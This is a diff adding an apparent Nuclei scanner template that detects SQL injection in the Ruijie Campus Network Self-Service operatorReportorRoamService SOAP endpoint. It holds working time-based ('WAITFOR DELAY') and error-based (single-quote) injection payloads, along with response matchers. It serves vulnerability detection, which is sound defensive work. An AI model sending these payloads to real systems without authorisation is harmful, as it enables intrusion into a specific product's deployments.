@@ -1,0 +1,85 @@
+id: ruijie-campus-network-self-service-operatorreportorroamservice-sqli
+
+info:
+  name: Ruijie Campus Network Self-Service SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Ruijie Campus Network Self-Service system at the operatorReportorRoamService endpoint.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: delay-based-sqli
+    method: POST
+    path:
+      - "/selfservice/service/operatorReportorRoamService"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
+      <soapenv:Header/>
+      <soapenv:Body>
+      <ser:queryOperatorUuid>
+      <!--type: string-->
+      <ser:in0>';WAITFOR DELAY '0:0:{{t1}}'--</ser:in0>
+      </ser:queryOperatorUuid>
+      </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "请输入对应对接运营商"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+
+  - id: error-based-sqli
+    method: POST
+    path:
+      - "/selfservice/service/operatorReportorRoamService"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
+      <soapenv:Header/>
+      <soapenv:Body>
+      <ser:queryOperatorUuid>
+      <!--type: string-->
+      <ser:in0>'</ser:in0>
+      </ser:queryOperatorUuid>
+      </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "执行过程中发生异常，请查看后台错误日志"
+        part: body
+      - type: word
+        words:
+          - "请输入对应对接运营商"
+        part: body
+        negative: true
+      - type: word
+        words:
+          - "text/xml"
+        part: header
